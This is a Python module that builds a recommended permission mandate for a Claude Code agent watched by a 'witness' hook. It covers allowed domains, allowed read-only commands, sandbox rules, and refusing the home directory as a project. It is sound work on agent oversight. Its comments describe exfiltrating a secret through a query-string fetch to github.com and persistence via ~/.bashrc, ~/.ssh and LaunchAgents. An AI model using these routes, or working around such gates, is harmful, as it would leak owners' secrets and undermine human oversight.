"""The recommended mandate form for a Claude Code agent (`deus-witness-hook --print-form`): plain data, the same lists the Mandate page
shows (web/js/mandate_form.js) and the server's preset (server/app/toolmap.py CC_READONLY_COMMANDS); a test keeps them equal."""
from __future__ import annotations

import os
import tempfile

# Default WebFetch allow-list of the recommended mandate (message.domains): documentation and package indexes only.
# 0.2.22: NO host where anyone can publish content (github.com, raw.githubusercontent.com, gist.github.com, gist.githubusercontent.com,
# pastebins, ...): a GET with a query string to such a host is a way out for stolen data (a mandate that allows github.com allows
# `WebFetch https://github.com/x?q=<secret>`). Read-only documentation hosts stay (the agent can still read docs offline-free), plus
# localhost for local dev servers. Needs github.com for a project? Add it deliberately on the Mandate page (a signed, visible choice).
# docs.github.com is kept: it is GitHub's own documentation, nobody can publish on it. Same list as the server's (a test keeps them equal).
DEFAULT_WEB_DOMAINS = ["localhost", "127.0.0.1", "docs.python.org", "pypi.org", "docs.github.com",
                       "developer.mozilla.org", "www.npmjs.com", "nodejs.org", "docs.anthropic.com", "code.claude.com"]

# Default read-only commands of the recommended mandate (command.allow), 0.2.9: modelled on Claude Code's own read-only set.
# A listed name covers only the plain form of the command (the witness names other forms differently and asks). Same list: the server's
# preset and the Mandate page (a test keeps them equal). The owner-facing summary is docs/coverage-public.md.
# 0.2.37: + 15 local writes (mkdir, touch, cp, mv, ln, chmod, rm, rmdir, git add/commit/checkout/switch/restore/mv/rm): the witness (server
# 0.2.53) lets only the form through whose every path is inside the project; any other form of them is asked.
# 0.2.38: + find, sed, awk, jq: the witness (server 0.2.54) lets only the form through that reads and prints; -exec, -delete, sed -i, e, w,
# awk system(), pipes, print > file, jq env ... are asked.
# 0.2.89 (friction 03.11): + 19 read-only diagnostics after jq; each covers only its read-only form (server bashparse._ro_tags / _ro_ident):
# `git remote add`, `git tag v1`, `git stash` / `pop`, `git config k v`, `pip list --outdated`, `uv pip install`, `ps eww` (environments)
# are other identifiers, asked; "--version" = `python3 --version`, `node --version` ... (bashparse.VERSION_QUERIES).
DEFAULT_SAFE_COMMANDS = ["ls", "pwd", "cd", "cat", "head", "tail", "wc", "echo", "grep", "rg", "which", "file", "stat", "du", "df",
                         "date", "uname", "git status", "git log", "git diff", "git show", "git branch", "diff", "tree", "sort",
                         "uniq", "cut", "tr", "nl", "column", "basename", "dirname", "realpath", "sha1sum", "sha256sum", "sha512sum",
                         "shasum", "cmp", "comm", "test", "sleep", "git blame", "git ls-files", "git rev-parse", "git describe",
                         "git shortlog", "git grep", "git reflog",
                         "mkdir", "touch", "cp", "mv", "ln", "chmod", "rm", "rmdir", "git add", "git commit", "git checkout",
                         "git switch", "git restore", "git mv", "git rm",
                         "find", "sed", "awk", "jq",
                         "ps", "lsof", "whoami", "id", "git remote", "git tag list", "git stash list", "git stash show", "git config get", "npm ls", "npm list",
                         "pip list", "pip3 list", "pip freeze", "pip3 freeze", "pip show", "pip3 show", "uv pip", "git check-ignore", "git ls-tree", "git rev-list", "git merge-base", "git show-ref",
                         "--version"]


# 0.2.56 (V3): command.sandboxed = "allow" in the RECOMMENDED form: a test runner (pytest, npm test, make ...) runs without a question only
# while the hook reports that THIS call runs inside a strict Claude Code sandbox (macOS Seatbelt, no network, secrets unreadable, no retry
# outside it: server/app/hookjudge/sandbox.py); without that sandbox every runner is asked as before. A mandate signed WITHOUT this key is
# never widened: the core allows OK_SANDBOXED only when the signed mandate says "allow" (svidetel_v4/decide.py). Same value: the Mandate
# page's recommended section (web/js/mandate_form.js RECOMMENDED_SANDBOXED); a test keeps them equal.
DEFAULT_SANDBOXED = "allow"
# 0.2.58 (server 0.2.90, FABLE-NOL 03.11 "standing mandate"): the RECOMMENDED form says `unlisted: "allow"`: every shell command runs with
# a receipt; the owner is asked only at the four gates the witness names itself (G1 an irreversible delete outside the project, G2 any
# non-loopback exit incl. git push / pip install, G3 secrets, G4 shell rc / LaunchAgents / crontab / the agent's own settings / the witness),
# at a file this agent wrote and now runs, at a changed executed file, and for a line the classifier cannot read (opaque) outside a strict
# Claude Code sandbox. Same value: server/app/hookjudge/mapping.py DEFAULT_UNLISTED and web/js/mandate_form.js (a test keeps them equal).
DEFAULT_UNLISTED = "ask"      # 0.2.58 (QA 03.11): silence is bought by the strict OS sandbox (code option), not by the list; see server mapping.py
# 0.2.53 (pair of server 0.2.82, the irreversibility gate): the option "Code in Claude Code's strict sandbox: run without asking" = this
# reserved ENTRY of the signed command.allow list (the core's CDDL has no member for it; the core is shared with the offline checker).
# It names no command (the witness refuses a command of that name) and widens nothing alone: it needs command.sandboxed = "allow" in the
# same signed mandate and the hook's strict-sandbox fact for the call. Network, remote git, money, writes outside the project, the agent's
# settings and secrets stay asked. A mandate signed without the entry is never widened. Same value and default as the server's
# (server/app/hookjudge/mapping.py SANDBOXED_CODE, DEFAULT_SANDBOXED_CODE); a test keeps them equal.
SANDBOXED_CODE = "(code in the strict sandbox)"
DEFAULT_SANDBOXED_CODE = True


class ProjectRefused(ValueError):
    """29.10 (RT-BASHRC-2910, the "mine"): the directory given as the project is the whole machine or the home directory (or a folder
    above it). The recommended form lets the agent write anywhere inside the project, so such a form would let it rewrite ~/.bashrc,
    ~/.ssh/authorized_keys, LaunchAgents ... without a question once the owner signs it. Refused, never silently narrowed."""


def _expand(p: str, home=None) -> str:
    """A leading ~ names `home` when given (the hook's own HOME), else this process' ~."""
    if home and (p == "~" or p.startswith("~/")):
        return home + p[1:]
    return os.path.expanduser(p)


def refuse_reason(project_dir: str, home=None) -> str | None:
    """-> None when `project_dir` may be a project; else why not (one English sentence). `home`: the home directory to compare with
    (default: this process' ~). '/', a drive root, the home directory itself and any folder above it are refused (as realpaths)."""
    proj = os.path.realpath(_expand(project_dir, home))
    try:
        h = os.path.realpath(home or os.path.expanduser("~"))
    except (OSError, ValueError):
        h = None
    if os.path.dirname(proj) == proj:
        what = "the root of the file system"
    elif h and proj == h:
        what = "your home directory"
    elif h and (h + os.sep).startswith(proj.rstrip(os.sep) + os.sep):
        what = "a folder that contains your home directory"
    else:
        return None
    return ("%s is %s, not a project: the recommended mandate lets the agent write anywhere inside the project, so it could rewrite "
            "~/.bashrc, ~/.ssh or LaunchAgents without asking. Run this from the project's own folder or name that folder."
            % (proj, what))


def _scratch_targets() -> list:
    """0.2.58 / 0.2.90: Claude Code's own scratch directory of this user (/private/tmp/claude-<uid>, /tmp/claude-<uid>: session files,
    task outputs) is a delete target of the recommended form too: the agent writes there on every session; under the old form every such
    write was refused RESOURCE (66 of 1045 calls of the owner's corpus). Nothing else under /tmp (shared) is added."""
    try:
        uid = os.getuid()
    except AttributeError:
        return []
    return ["/private/tmp/claude-%d/*" % uid, "/tmp/claude-%d/*" % uid]


def default_form(project_dir: str, web_domains=None, safe_commands=None, home=None) -> dict:
    """Recommended mandate form for a Claude Code agent (the 'default rules'):
      - writes (Write/Edit/NotebookEdit/Bash redirections) only inside the project and the temp dir; elsewhere deny RESOURCE;
        0.2.32 (K1): EXCEPT the agent's own harness (<proj>/.claude/**, <proj>/.mcp.json, <proj>/.git/hooks/**, ~/.claude/**, the Deus
        Witness key files): the mandate format has no exclusions, so the witness asks the owner for those (category agent-config /
        git-config) and the hook itself refuses them without an owner-approved receipt (hook/main.py agent_config_target);
      - shell commands (0.2.58): every command runs with a receipt (`unlisted: "allow"`); the four gates (delete outside the project,
        any non-loopback exit, secrets, persistence / the witness itself), a file the agent wrote and runs, a changed executed file and
        an unreadable line are asked; reading a credential file is asked; a write outside the project runs after the hook kept a
        shadow copy (`deus-witness-hook --undo PATH` restores it), a place of persistence is refused outright;
      - WebFetch only to the listed domains; elsewhere deny RECIPIENT;
      - 0.2.53: code in Claude Code's strict sandbox runs without a question (SANDBOXED_CODE + sandboxed "allow"); exits stay asked;
      - no purchases.
    29.10: raises ProjectRefused for '/', the home directory or a folder above it (see refuse_reason)."""
    why = refuse_reason(project_dir, home)
    if why:
        raise ProjectRefused(why)
    proj = os.path.realpath(_expand(project_dir, home))
    tmp = os.path.realpath(tempfile.gettempdir())
    scratch = _scratch_targets()
    return {"currency": "USD", "valid_days": 30, "purchase": None,
            "message": {"domains": list(DEFAULT_WEB_DOMAINS if web_domains is None else web_domains), "to": []},
            "forbidden_data": [], "publish": None,
            "delete": {"targets": [proj + "/*", tmp + "/*"] + scratch, "allow_irreversible": True},
            "command": {"allow": list(DEFAULT_SAFE_COMMANDS if safe_commands is None else safe_commands)
                                 + ([SANDBOXED_CODE] if DEFAULT_SANDBOXED_CODE else []), "unlisted": DEFAULT_UNLISTED,
                        "sandboxed": DEFAULT_SANDBOXED}}
